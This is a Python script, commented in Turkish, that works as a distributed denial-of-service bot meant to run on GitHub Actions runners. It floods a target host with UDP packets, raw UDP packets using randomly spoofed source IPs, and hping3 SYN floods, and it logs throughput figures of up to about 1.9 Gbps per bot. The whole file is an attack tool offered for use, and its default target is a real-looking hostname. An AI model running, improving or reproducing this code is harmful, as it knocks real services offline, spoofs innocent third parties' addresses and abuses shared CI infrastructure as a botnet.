#!/usr/bin/env python3
"""
L4 REAL FLOOD — GitHub Actions GERCEK L4

TEST SONUCLARI:
  - Raw socket ACIK (root olarak calisiyor)
  - hping3 CALISIYOR (SYN flood)
  - UDP DGRAM: 171K PPS / 1.9 Gbps TEK BOT
  - nping CALISIYOR

STRATEJILER:
  1. UDP Flood (socket.SOCK_DGRAM) — en yuksek PPS/bandwidth
  2. hping3 SYN Flood (subprocess) — gercek SYN flood
  3. Raw socket UDP (SOCK_RAW) — IP header crafting
  4. Mixed (hepsi birden)

ENV:
  TARGET_URL   - hedef (hostname cikarilir)
  TARGET_HOST  - direkt IP/hostname
  TARGET_PORT  - port (default 80)
  DURATION     - sure (default 300)
  BOT_ID       - bot no
  MODE         - udp / syn / raw / mixed (default mixed)
  THREADS      - thread sayisi (default 100)
"""

import socket
import threading
import time
import os
import sys
import random
import struct
import subprocess
import signal

TARGET_HOST = os.environ.get('TARGET_HOST', '')
TARGET_PORT = int(os.environ.get('TARGET_PORT', '80'))
THREADS = int(os.environ.get('THREADS', '100'))
DURATION = int(os.environ.get('DURATION', '300'))
BOT_ID = os.environ.get('BOT_ID', '0')
MODE = os.environ.get('MODE', 'mixed')

# URL'den host cikar
if not TARGET_HOST:
    target_url = os.environ.get('TARGET_URL', 'https://gorouter.app')
    if '://' in target_url:
        target_url = target_url.split('://')[1]
    if '/' in target_url:
        target_url = target_url.split('/')[0]
    if ':' in target_url:
        parts = target_url.split(':')
        TARGET_HOST = parts[0]
        TARGET_PORT = int(parts[1])
    else:
        TARGET_HOST = target_url

try:
    TARGET_IP = socket.gethostbyname(TARGET_HOST)
except:
    TARGET_IP = TARGET_HOST

print(f'=== L4 REAL FLOOD BOT #{BOT_ID} ===')
print(f'Host: {TARGET_HOST} -> {TARGET_IP}')
print(f'Port: {TARGET_PORT}')
print(f'Mode: {MODE}')
print(f'Threads: {THREADS}')
print(f'Duration: {DURATION}s')
print()

# Stats
stats = {
    'udp_sent': 0, 'udp_bytes': 0,
    'syn_sent': 0,
    'raw_sent': 0, 'raw_bytes': 0,
    'errors': 0,
    'start': time.time()
}

# ============================================================
# UDP FLOOD — En yuksek PPS/bandwidth (1.9 Gbps tek thread!)
# ============================================================
def udp_flood_worker():
    """Normal UDP socket ile max speed flood."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Buyuk payload = yuksek bandwidth
    payload = os.urandom(1400)  # MTU-safe max
    target = (TARGET_IP, TARGET_PORT)
    end_time = stats['start'] + DURATION
    local_sent = 0
    local_bytes = 0
    while time.time() < end_time:
        try:
            s.sendto(payload, target)
            local_sent += 1
            local_bytes += 1400
        except:
            stats['errors'] += 1
            try:
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            except:
                pass
        # Her 1000 pakette stats guncelle (lock overhead azalt)
        if local_sent % 1000 == 0:
            stats['udp_sent'] += 1000
            stats['udp_bytes'] += 1000 * 1400
    stats['udp_sent'] += local_sent % 1000
    stats['udp_bytes'] += (local_sent % 1000) * 1400
    s.close()

# ============================================================
# RAW UDP FLOOD — IP header crafting
# ============================================================
def raw_udp_worker():
    """Raw socket ile UDP flood — IP spoofing mumkun."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        # Fallback normal UDP
        udp_flood_worker()
        return
    
    end_time = stats['start'] + DURATION
    while time.time() < end_time:
        try:
            # Random source IP (spoofing)
            src_ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
            src_port = random.randint(1024, 65535)
            
            # IP header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 28 + 1400,  # version, TOS, total length
                random.randint(0, 65535), 0,  # ID, flags+offset
                64, 17, 0,  # TTL, protocol (UDP), checksum
                socket.inet_aton(src_ip),
                socket.inet_aton(TARGET_IP)
            )
            
            # UDP header
            udp_header = struct.pack('!HHHH',
                src_port, TARGET_PORT,
                8 + 1400, 0  # length, checksum
            )
            
            payload = os.urandom(1400)
            packet = ip_header + udp_header + payload
            
            s.sendto(packet, (TARGET_IP, 0))
            stats['raw_sent'] += 1
            stats['raw_bytes'] += len(packet)
        except:
            stats['errors'] += 1
    s.close()

# ============================================================
# HPING3 SYN FLOOD — Gercek SYN flood (subprocess)
# ============================================================
hping_procs = []

def start_hping3_flood():
    """hping3 ile gercek SYN flood baslat."""
    global hping_procs
    # Birden fazla hping3 process
    num_procs = min(THREADS // 10, 20)  # max 20 hping3 process
    if num_procs < 1:
        num_procs = 1
    
    for i in range(num_procs):
        try:
            port = TARGET_PORT + (i % 10) if TARGET_PORT < 65530 else TARGET_PORT
            proc = subprocess.Popen(
                ['hping3', '--flood', '--syn',
                 '-p', str(port),
                 '--rand-source',  # random source IP
                 '-d', '120',      # data size
                 TARGET_IP],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            hping_procs.append(proc)
            print(f'  hping3 process #{i+1} started (port {port})')
        except Exception as e:
            print(f'  hping3 #{i+1} failed: {e}')

def stop_hping3():
    """hping3 process'lerini durdur."""
    for proc in hping_procs:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except:
            try:
                proc.kill()
            except:
                pass

# ============================================================
# MAIN
# ============================================================
print(f'--- STARTING L4 FLOOD ({MODE}) ---')

if MODE == 'syn':
    # Pure SYN flood
    start_hping3_flood()
    # Bekle
    time.sleep(DURATION)
    stop_hping3()
    print('SYN flood tamamlandi (hping3 istatistik vermiyor)')

elif MODE == 'udp':
    # Pure UDP flood
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=udp_flood_worker, daemon=True)
        t.start()
        threads.append(t)

elif MODE == 'raw':
    # Raw UDP flood
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=raw_udp_worker, daemon=True)
        t.start()
        threads.append(t)

elif MODE == 'mixed':
    # Mixed: hping3 SYN + UDP flood
    start_hping3_flood()
    threads = []
    # Kalan thread'ler UDP
    udp_threads = max(THREADS - len(hping_procs) * 5, 20)
    for i in range(udp_threads):
        t = threading.Thread(target=udp_flood_worker, daemon=True)
        t.start()
        threads.append(t)

# Progress log
if MODE != 'syn':
    while time.time() - stats['start'] < DURATION:
        elapsed = int(time.time() - stats['start'])
        total_pkts = stats['udp_sent'] + stats['raw_sent']
        total_bytes = stats['udp_bytes'] + stats['raw_bytes']
        pps = total_pkts / max(elapsed, 1)
        mbps = (total_bytes * 8) / max(elapsed, 1) / 1_000_000
        gbps = mbps / 1000
        print(f'[LIVE L4 bot={BOT_ID}] t={elapsed}s | udp={stats["udp_sent"]} raw={stats["raw_sent"]} | pps={pps:.0f} | {mbps:.0f} Mbps ({gbps:.2f} Gbps) | err={stats["errors"]}')
        time.sleep(5)

if MODE == 'mixed':
    stop_hping3()

# Final summary
elapsed = time.time() - stats['start']
total_pkts = stats['udp_sent'] + stats['raw_sent']
total_bytes = stats['udp_bytes'] + stats['raw_bytes']
pps = total_pkts / max(elapsed, 1)
mbps = (total_bytes * 8) / max(elapsed, 1) / 1_000_000
gbps = mbps / 1000

print()
print(f'=== L4 FLOOD SUMMARY BOT #{BOT_ID} ===')
print(f'  Mode          : {MODE}')
print(f'  Duration      : {elapsed:.0f}s')
print(f'  UDP packets   : {stats["udp_sent"]}')
print(f'  Raw packets   : {stats["raw_sent"]}')
print(f'  SYN (hping3)  : {len(hping_procs)} processes')
print(f'  Total packets : {total_pkts}')
print(f'  Total data    : {total_bytes / 1024 / 1024:.0f} MB')
print(f'  Avg PPS       : {pps:.0f}')
print(f'  Avg Bandwidth : {mbps:.0f} Mbps ({gbps:.2f} Gbps)')
print(f'  Errors        : {stats["errors"]}')